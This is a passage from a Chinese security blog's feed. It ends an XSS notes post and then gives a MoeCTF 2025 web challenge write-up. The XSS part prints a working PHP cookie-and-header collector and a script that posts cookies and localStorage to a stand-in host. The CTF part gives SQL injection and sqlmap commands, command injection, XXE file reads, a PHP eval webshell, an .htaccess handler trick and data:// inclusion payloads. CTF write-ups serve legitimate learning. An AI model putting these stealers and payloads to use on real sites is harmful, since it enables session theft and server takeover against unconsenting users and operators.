$_GET[&#x27;view&#x27;] === $password) &#123;</span><br><span class="line">    // 显示收集的数据</span><br><span class="line">    header(&#x27;Content-Type: text/html&#x27;);</span><br><span class="line">    echo &#x27;&lt;h1&gt;Stolen Data&lt;/h1&gt;&lt;pre&gt;&#x27;;</span><br><span class="line">    echo file_get_contents(&#x27;stolen_data.log&#x27;);</span><br><span class="line">    echo &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 记录数据</span><br><span class="line">$data = [</span><br><span class="line">    &#x27;time&#x27; =&gt; date(&#x27;Y-m-d H:i:s&#x27;),</span><br><span class="line">    &#x27;ip&#x27; =&gt; $_SERVER[&#x27;REMOTE_ADDR&#x27;],</span><br><span class="line">    &#x27;cookie&#x27; =&gt; $_COOKIE,</span><br><span class="line">    &#x27;get&#x27; =&gt; $_GET,</span><br><span class="line">    &#x27;post&#x27; =&gt; $_POST,</span><br><span class="line">    &#x27;headers&#x27; =&gt; getallheaders()</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">file_put_contents(&#x27;data.txt&#x27;, json_encode($data).&quot;\n&quot;, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">// 返回无害响应</span><br><span class="line">header(&#x27;Content-Type: image/gif&#x27;);</span><br><span class="line">echo base64_decode(&#x27;R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">fetch(&#x27;https://your-site.com/steal.php&#x27;, &#123;</span><br><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">    body: JSON.stringify(&#123;</span><br><span class="line">        cookie: document.cookie,</span><br><span class="line">        url: location.href,</span><br><span class="line">        userAgent: navigator.userAgent,</span><br><span class="line">        localStorage: JSON.stringify(localStorage)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).catch(e =&gt; console.error(e));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="安全防御"><a href="#安全防御" class="headerlink" title="安全防御"></a>安全防御</h1><p>【遇到安全防御，就跑路吧，本来利用的点就少，绕过也很鸡肋，可能ctf当中会出现关于考点绕过手段，需要使用的时候查相应cve或者文章就好了】</p><h2 id="csp"><a href="#csp" class="headerlink" title="csp"></a>csp</h2><p><a href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=Content+Security+Policy&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiJDb250ZW50IFNlY3VyaXR5IFBvbGljeSIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjI1NDE0MDQ2NSwiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.fjiJOVS7QHKYD8ZuPn9LZzbgPjj6EmqperajT0eWUZg&zhida_source=entity">Content Security Policy</a>（CSP）是一种浏览器安全机制，用于防止各种类型的<a href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiLot6jnq5nohJrmnKzmlLvlh7siLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTQxNDA0NjUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.Dt3u0GHZEZ5dcLGm83Eg6EEwiwKqKAjs2UuR2M7cYb0&zhida_source=entity">跨站脚本攻击</a>（XSS）和<a href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiLmlbDmja7ms6jlhaXmlLvlh7siLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTQxNDA0NjUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.ldB8RMO-1-GDB2ZNl5nNdIIHN7NKoI0Ks91Ygu7xr6g&zhida_source=entity">数据注入攻击</a>。通过定义一组规则，CSP 允许网站管理员指定哪些资源可以被加载和执行，进而限制外部恶意脚本的执行，确保网站的安全性。CSP 为网站提供了一层额外的保护，可以有效地阻止恶意代码注入，提升网站的抗攻击能力。本文将详细讲解什么是 CSP，如何使用 CSP 配置 Web 应用程序的安全策略。</p><h2 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h2><p>如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。XSS全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p><p>绕过【实则不太管用】：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cve-2012</span><br><span class="line"></span><br><span class="line">phpinfo</span><br><span class="line"></span><br><span class="line">flash，java的api获取</span><br></pre></td></tr></table></figure><h2 id="xssfifter"><a href="#xssfifter" class="headerlink" title="xssfifter"></a>xssfifter</h2><p>就是前面的各种正则的限制手段，依旧标签过滤</p><h1 id="xss-stricke"><a href="#xss-stricke" class="headerlink" title="xss-stricke"></a>xss-stricke</h1><p>XSStrike是一款检测Cross Site Scripting的高级检测工具。它集成了payload生成器、爬虫和模糊引擎功能。XSStrike不是像其他工具那样注入有效负载并检查其工作，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效负载。除此之外，XSStrike还具有爬行，模糊测试，参数发现，WAF检测功能。它还会扫描DOM XSS漏洞。</p><p><a href="https://github.com/s0md3v/XSStrike">s0md3v&#x2F;XSStrike: Most advanced XSS scanner.</a></p><p>就像sql注入中的sqlmap</p><h1 id="攻防利用"><a href="#攻防利用" class="headerlink" title="攻防利用"></a>攻防利用</h1><p>关于xss的攻防利用，多用于组合拳的使用以及攻防时候，src利用的点少，能弹窗验证有漏洞点就好了，差异还是挺大的，但是问题不大，还是比较好食用</p><h2 id="cookie盗取"><a href="#cookie盗取" class="headerlink" title="cookie盗取"></a>cookie盗取</h2><p>就是盲打，把有数据交互的地方都插上payload，等想应登陆态的用户查看或者点击，以达到获得cookie会话</p><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><p>弹窗跳转网页，或者提醒下载更新，已达到具体想要上线或者敏感信息获取的效果</p><h2 id="联合代码审计rce"><a href="#联合代码审计rce" class="headerlink" title="联合代码审计rce"></a>联合代码审计rce</h2><p>这是小迪安全2024xss部分的一个小皮面板案例，具体的cms偏代码审计的联动外部请求进行rce，需要特定情况下的xss条件才能产生</p>]]></content>
      
      
      <categories>
          
          <category> 一个男人一句话改变我的一生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个男人一句话改变我的一生之moectf2025</title>
      <link href="/posts/63963.html"/>
      <url>/posts/63963.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当初川师范大学cssec信安组的CoHyu大师傅的一句moectf是梦开启的地方以及Sonder大师傅的moectf的题质量都很高，可以加油学学.</span><br><span class="line">于是就打了moectf2025，但时间线太长了就打了一周，现在完赛了</span><br><span class="line">于是打算复现一手web以及pwn部分，pwn部分就放到《每天都要pwn一点》系列了</span><br></pre></td></tr></table></figure><h1 id="moectf2025"><a href="#moectf2025" class="headerlink" title="moectf2025"></a>moectf2025</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.xidian.edu.cn/training/22</span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="0-Web入门指北"><a href="#0-Web入门指北" class="headerlink" title="0 Web入门指北"></a><strong>0 Web入门指北</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你知道什么是控制台吗？快去了解一下吧！</span><br><span class="line"></span><br><span class="line">((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[]).......</span><br></pre></td></tr></table></figure><h4 id="考点：jsfuck编码。"><a href="#考点：jsfuck编码。" class="headerlink" title="考点：jsfuck编码。"></a>考点：jsfuck编码。</h4><p>可以控制台解也可以解码工具解</p><p><img src="/../images/image-20251013223042633-1760512687698-47.png" alt="image-20251013223042633"></p><h3 id="01-第一章-神秘的手镯"><a href="#01-第一章-神秘的手镯" class="headerlink" title="01 第一章 神秘的手镯"></a><strong>01 第一章 神秘的手镯</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：这个手镯需要输入咒语才能启封？</span><br></pre></td></tr></table></figure><h4 id="预期解1考点-f12查看源码"><a href="#预期解1考点-f12查看源码" class="headerlink" title="预期解1考点:f12查看源码"></a>预期解1考点:f12查看源码</h4><p><img src="/../images/image-20251013223357956-1760512687698-46.png" alt="image-20251013223357956"></p><h4 id="预期解2考点-修改html"><a href="#预期解2考点-修改html" class="headerlink" title="预期解2考点:修改html"></a>预期解2考点:修改html</h4><p><img src="/../images/image-20251013223817177-1760512687698-45.png" alt="image-20251013223817177"></p><p><img src="/../images/image-20251013223832803-1760512687698-44.png" alt="image-20251013223832803"></p><h3 id="01-第一章-神秘的手镯-revenge"><a href="#01-第一章-神秘的手镯-revenge" class="headerlink" title="01 第一章 神秘的手镯_revenge"></a><strong>01 第一章 神秘的手镯_revenge</strong></h3><h4 id="考点：爆破"><a href="#考点：爆破" class="headerlink" title="考点：爆破"></a>考点：爆破</h4><p>根据hint访问&#x2F;wanyanzhou.txt.bak</p><p><img src="/../images/image-20251015110629525-1760512687698-51.png" alt="image-20251015110629525"></p><p>要重复放500次的密码官wp说禁止了python等传输，要用bp等爆破500次就能拿到flag</p><h3 id="02-第二章-初识金曦玄轨"><a href="#02-第二章-初识金曦玄轨" class="headerlink" title="02 第二章 初识金曦玄轨"></a><strong>02 第二章 初识金曦玄轨</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：你知道什么是http请求包吗？抓一个看看吧！</span><br></pre></td></tr></table></figure><p>f12查看模糊的字符串，前往&#x2F;golden_trail</p><p><img src="/../images/image-20251013224031764-1760512687698-48.png" alt="image-20251013224031764"></p><h4 id="考点：抓包"><a href="#考点：抓包" class="headerlink" title="考点：抓包"></a>考点：抓包</h4><p><img src="/../images/image-20251013224913661-1760512687698-49.png" alt="image-20251013224913661"></p><h3 id="03-第三章-问剑石！篡天改命！"><a href="#03-第三章-问剑石！篡天改命！" class="headerlink" title="03 第三章 问剑石！篡天改命！"></a><strong>03 第三章 问剑石！篡天改命！</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：仙门试炼台中央矗立着玄天剑宗至宝&quot;问剑石&quot;，石身流转着七彩霞光。你作为新晋弟子需测试天赋，但暗中知晓问剑石运作的玄机——其天赋判定实则通过金曦玄轨传递信息。初始测试将显示天赋：B，光芒：无，你需要施展&quot;篡天改命&quot;之术，修改玄轨中的关键参数，使问剑石显现天赋：S，光芒：流云状青芒(flowing_azure_clouds)的异象，从而获得宗门重视！</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251013230410807-1760512687699-58.png" alt="image-20251013230410807"></p><h4 id="考点：get-post请求"><a href="#考点：get-post请求" class="headerlink" title="考点：get&#x2F;post请求"></a>考点：get&#x2F;post请求</h4><p>注意post是json格式就好了</p><p><img src="/../images/image-20251013230448086-1760512687698-53.png" alt="image-20251013230448086"></p><h3 id="04-第四章-金曦破禁与七绝傀儡阵"><a href="#04-第四章-金曦破禁与七绝傀儡阵" class="headerlink" title="04 第四章 金曦破禁与七绝傀儡阵"></a><strong>04 第四章 金曦破禁与七绝傀儡阵</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：http请求有很多讲究！试试吧！</span><br></pre></td></tr></table></figure><h4 id="考点：http协议"><a href="#考点：http协议" class="headerlink" title="考点：http协议"></a>考点：http协议</h4><p>第一关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:11060/stone_golem?key=xdsec</span><br></pre></td></tr></table></figure><p>第二关<img src="/../images/image-20251013231927750-1760512687698-50.png" alt="image-20251013231927750"></p><p>第三关</p><p><img src="/../images/image-20251013232131503-1760512687698-52.png" alt="image-20251013232131503"></p><p>第四关</p><p><img src="/../images/image-20251013232220770-1760512687699-54.png" alt="image-20251013232220770"></p><p>第五关</p><p><img src="/../images/image-20251013232344908-1760512687699-56.png" alt="image-20251013232344908"></p><p>第六关</p><p><img src="/../images/image-20251013232428421-1760512687699-55.png" alt="image-20251013232428421"></p><p>第七关</p><p><img src="/../images/image-20251013232541334-1760512687699-57.png" alt="image-20251013232541334"></p><p>全部密钥合起来base64解密即可</p><h3 id="05-第五章-打上门来！"><a href="#05-第五章-打上门来！" class="headerlink" title="05 第五章 打上门来！"></a><strong>05 第五章 打上门来！</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：CTF中有一招在文件目录中穿梭的技法，是什么呢？</span><br></pre></td></tr></table></figure><h4 id="考点：目录穿越"><a href="#考点：目录穿越" class="headerlink" title="考点：目录穿越"></a>考点：目录穿越</h4><p><img src="/../images/image-20251013233525724-1760512687699-61.png" alt="image-20251013233525724"></p><h3 id="06-第六章-藏经禁制？玄机初探！"><a href="#06-第六章-藏经禁制？玄机初探！" class="headerlink" title="06 第六章 藏经禁制？玄机初探！"></a><strong>06 第六章 藏经禁制？玄机初探！</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：一个登录页面。（不告诉我账号密码就让我登录，难道我是神仙吗哈哈？）</span><br></pre></td></tr></table></figure><h4 id="考点：sql的万能密码登陆"><a href="#考点：sql的万能密码登陆" class="headerlink" title="考点：sql的万能密码登陆"></a>考点：sql的万能密码登陆</h4><p><img src="/../images/image-20251013233713280-1760512687699-60.png" alt="image-20251013233713280"></p><h3 id="07-第七章-灵蛛探穴与阴阳双生符"><a href="#07-第七章-灵蛛探穴与阴阳双生符" class="headerlink" title="07 第七章 灵蛛探穴与阴阳双生符"></a><strong>07 第七章 灵蛛探穴与阴阳双生符</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。</span><br></pre></td></tr></table></figure><h4 id="考点：robots-txt，md5弱比较"><a href="#考点：robots-txt，md5弱比较" class="headerlink" title="考点：robots.txt，md5弱比较"></a>考点：robots.txt，md5弱比较</h4><p>访问&#x2F;robots.txt 进入flag.php</p><p><img src="/../images/image-20251013234409035-1760512687699-59.png" alt="image-20251013234409035"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2出现报错，看官wp是在php8版本下被禁用了</span><br><span class="line"># 强相等</span><br><span class="line">/?a=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&amp;b=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</span><br><span class="line"># 弱相等</span><br><span class="line">/?a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure><h3 id="08-第八章-天衍真言，星图显圣"><a href="#08-第八章-天衍真言，星图显圣" class="headerlink" title="08 第八章 天衍真言，星图显圣"></a><strong>08 第八章 天衍真言，星图显圣</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：和上次一样的界面，那我再登录一次就行了……吗？</span><br></pre></td></tr></table></figure><h4 id="考点：简单的sql注入"><a href="#考点：简单的sql注入" class="headerlink" title="考点：简单的sql注入"></a>考点：简单的sql注入</h4><p>sqlmap的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=守陵人&amp;password=周天星诀&quot; --batch --dbs</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=守陵人&amp;password=周天星诀&quot; --batch -D user --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=守陵人&amp;password=周天星诀&quot; --batch -D user -T flag --columns</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=守陵人&amp;password=周天星诀&quot; --batch -D user -T flag --dump</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251013235658528-1760512687700-65.png" alt="image-20251013235658528"></p><p>手测【官wp】：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; UNION SELECT 1,2 #</span><br><span class="line"># 回显 Welcome 1</span><br><span class="line"></span><br><span class="line">1&#x27; union select table_name,2 from information_schema.tables where table_schema=database() #</span><br><span class="line"># 回显 Welcome flag</span><br><span class="line"></span><br><span class="line">1&#x27; union select column_name,2 from information_schema.columns where table_name=&#x27;flag&#x27; #</span><br><span class="line"># 回显 Welcome value</span><br><span class="line"></span><br><span class="line">1&#x27; union select value,2 from flag #</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251013235903297-1760512687700-64.png" alt="image-20251013235903297"></p><h3 id="09-第九章-星墟禁制·天机问路"><a href="#09-第九章-星墟禁制·天机问路" class="headerlink" title="09 第九章 星墟禁制·天机问路"></a><strong>09 第九章 星墟禁制·天机问路</strong></h3><h4 id="考点：-URL-参数直接向服务器系统发送命令"><a href="#考点：-URL-参数直接向服务器系统发送命令" class="headerlink" title="考点： URL 参数直接向服务器系统发送命令"></a>考点： URL 参数直接向服务器系统发送命令</h4><p>官wp给出的php核心源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&#x27;url&#x27;];</span><br><span class="line">system(&quot;nslookup &quot; . $cmd);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=baidu.com;env</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014125213965-1760512687699-62.png" alt="image-20251014125213965"></p><h3 id="10-第十章-天机符阵"><a href="#10-第十章-天机符阵" class="headerlink" title="10 第十章 天机符阵"></a><strong>10 第十章 天机符阵</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：flag在flag.txt里</span><br></pre></td></tr></table></figure><h4 id="考点：xxe注入"><a href="#考点：xxe注入" class="headerlink" title="考点：xxe注入"></a>考点：xxe注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">  &lt;!ENTITY abc SYSTEM &quot;file:///var/www/html/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;解析&gt;&amp;abc;&lt;/解析&gt;</span><br></pre></td></tr></table></figure><h3 id="10-第十章-天机符阵-revenge"><a href="#10-第十章-天机符阵-revenge" class="headerlink" title="10 第十章 天机符阵_revenge"></a><strong>10 第十章 天机符阵_revenge</strong></h3><h4 id="考点：XXE注入"><a href="#考点：XXE注入" class="headerlink" title="考点：XXE注入"></a>考点：<code>XXE</code>注入</h4><p>flag的位置不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">  &lt;!ENTITY abc SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;解析&gt;&amp;abc;&lt;/解析&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251015111745490-1760512687699-63.png" alt="image-20251015111745490"></p><h3 id="11-第十一章-千机变·破妄之眼"><a href="#11-第十一章-千机变·破妄之眼" class="headerlink" title="11 第十一章 千机变·破妄之眼"></a><strong>11 第十一章 千机变·破妄之眼</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：HDdss看到了 GET 参数名由m,n,o,p,q这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道参数名等于参数值才能进入。</span><br></pre></td></tr></table></figure><h4 id="考点：爆破参数名，php伪协议读取文件"><a href="#考点：爆破参数名，php伪协议读取文件" class="headerlink" title="考点：爆破参数名，php伪协议读取文件"></a>考点：爆破参数名，php伪协议读取文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="12-第十二章-玉魄玄关·破妄"><a href="#12-第十二章-玉魄玄关·破妄" class="headerlink" title="12 第十二章 玉魄玄关·破妄"></a><strong>12 第十二章 玉魄玄关·破妄</strong></h3><h4 id="考点：连接一句话木马"><a href="#考点：连接一句话木马" class="headerlink" title="考点：连接一句话木马"></a>考点：连接一句话木马</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：这道题用于学习 蚁剑 的使用，请使用 蚁剑 完成本题</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014130414238-1760512687700-66.png" alt="image-20251014130414238"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;env&quot;);</span><br></pre></td></tr></table></figure><h3 id="13-第十三章-通幽关·灵纹诡影"><a href="#13-第十三章-通幽关·灵纹诡影" class="headerlink" title="13 第十三章 通幽关·灵纹诡影"></a>13 第十三章 通幽关·灵纹诡影</h3><h4 id="考点：图片马文件上传"><a href="#考点：图片马文件上传" class="headerlink" title="考点：图片马文件上传"></a>考点：图片马文件上传</h4><p>只过滤了jpg的文件头，做一个图片马即可，后缀都不用改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b + 2.php/a 3.php</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014132349848-1760512687700-67.png" alt="image-20251014132349848"></p><h3 id="14-第十四章-御神关·补天玉碑"><a href="#14-第十四章-御神关·补天玉碑" class="headerlink" title="14 第十四章 御神关·补天玉碑"></a><strong>14 第十四章 御神关·补天玉碑</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：Apache有一个特殊文件，是什么呢？</span><br></pre></td></tr></table></figure><h4 id="考点：-htaccess文件上传"><a href="#考点：-htaccess文件上传" class="headerlink" title="考点：.htaccess文件上传"></a>考点：.htaccess文件上传</h4><p>先上传一个<code>.htaccess</code>文件,重写解析规则，当PHP文件执行就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>然后依旧把图片马放上去就好了</p><p><img src="/../images/image-20251014161940352-1760512687700-70.png" alt="image-20251014161940352"></p><h3 id="15-第十五章-归真关·竞时净魔"><a href="#15-第十五章-归真关·竞时净魔" class="headerlink" title="15 第十五章 归真关·竞时净魔"></a><strong>15 第十五章 归真关·竞时净魔</strong></h3><h4 id="考点：条件竞争文件上传"><a href="#考点：条件竞争文件上传" class="headerlink" title="考点：条件竞争文件上传"></a>考点：条件竞争文件上传</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：图片上传至/uploads</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_45588247/article/details/118796606">【文件上传绕过】——条件竞争漏洞_条件竞争上传漏洞-CSDN博客</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">条件竞争，一边使用爆破一直高速上传一个普通木马文件，一边使用爆破访问这个木马文件。</span><br></pre></td></tr></table></figure><h3 id="16-第十六章-昆仑星途"><a href="#16-第十六章-昆仑星途" class="headerlink" title="16 第十六章 昆仑星途"></a><strong>16 第十六章 昆仑星途</strong></h3><h4 id="考点：文件包含漏洞"><a href="#考点：文件包含漏洞" class="headerlink" title="考点：文件包含漏洞"></a>考点：<strong>文件包含漏洞</strong></h4><p><img src="/../images/image-20251014162605420-1760512687700-71.png" alt="image-20251014162605420"></p><p>php伪协议的data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;ls /&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?php system(&quot;cat /flag-OrvL3PF4K1VMXkEVzkNTMJsa8Txt7c.txt&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014163125848-1760512687700-69.png" alt="image-20251014163125848"></p><h3 id="17-第十七章-星骸迷阵·神念重构"><a href="#17-第十七章-星骸迷阵·神念重构" class="headerlink" title="17 第十七章 星骸迷阵·神念重构"></a><strong>17 第十七章 星骸迷阵·神念重构</strong></h3><h4 id="考点：php反序列化"><a href="#考点：php反序列化" class="headerlink" title="考点：php反序列化"></a>考点：php反序列化</h4><p><img src="/../images/image-20251014163228096-1760512687700-68.png" alt="image-20251014163228096"></p><figure class="highlight 